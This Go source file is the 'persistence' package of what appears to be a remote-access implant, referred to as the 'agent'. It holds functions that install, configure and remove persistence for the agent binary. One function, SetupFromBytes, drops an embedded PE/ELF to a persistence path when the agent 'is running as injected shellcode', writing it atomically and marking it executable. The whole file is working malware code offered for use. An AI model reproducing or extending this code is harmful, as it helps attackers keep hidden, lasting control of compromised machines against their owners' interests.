package persistence

import (
	"fmt"
	"os"
	"path/filepath"
)

var DefaultPersistenceMethod = "startup"

var DefaultStartupName = ""

var persistInstallFns []func(exePath string) error

var persistUninstallFns []func() error

func Setup() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}
	exePath, err = filepath.Abs(exePath)
	if err != nil {
		return err
	}
	return install(exePath)
}

func InstallFrom(exePath string) error {
	return install(exePath)
}

func Configure(exePath string) error {
	return configure(exePath)
}

func TargetPath() (string, error) {
	return getTargetPath()
}

func Remove() error {
	return uninstall()
}

// SetupFromBytes writes data to the platform persistence target path and
// registers it — used when the agent is running as injected shellcode and
// selfDropBinary contains the normal (non-shellcode) agent PE/ELF.
func SetupFromBytes(data []byte) error {
	if len(data) == 0 {
		return fmt.Errorf("embedded binary is empty")
	}
	targetPath, err := getTargetPath()
	if err != nil {
		return fmt.Errorf("failed to resolve target path: %w", err)
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}
	if err := writeBytes(targetPath, data); err != nil {
		return err
	}
	return configure(targetPath)
}

// writeBytes atomically writes data to dest via a temp file then rename.
func writeBytes(dest string, data []byte) error {
	dir := filepath.Dir(dest)
	tmp, err := os.CreateTemp(dir, "agent-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp file: %w", err)
	}
	tmpPath := tmp.Name()
	defer func() { _ = os.Remove(tmpPath) }()

	if _, err := tmp.Write(data); err != nil {
		_ = tmp.Close()
		return fmt.Errorf("failed to write binary: %w", err)
	}
	if err := tmp.Sync(); err != nil {
		_ = tmp.Close()
		return fmt.Errorf("failed to sync: %w", err)
	}
	if err := tmp.Close(); err != nil {
		return fmt.Errorf("failed to close temp file: %w", err)
	}
	if err := os.Rename(tmpPath, dest); err != nil {
		if rmErr := os.Remove(dest); rmErr == nil {
			err = os.Rename(tmpPath, dest)
		}
		if err != nil {
			return fmt.Errorf("failed to place binary at %s: %w", dest, err)
		}
	}
	return os.Chmod(dest, 0755)
}
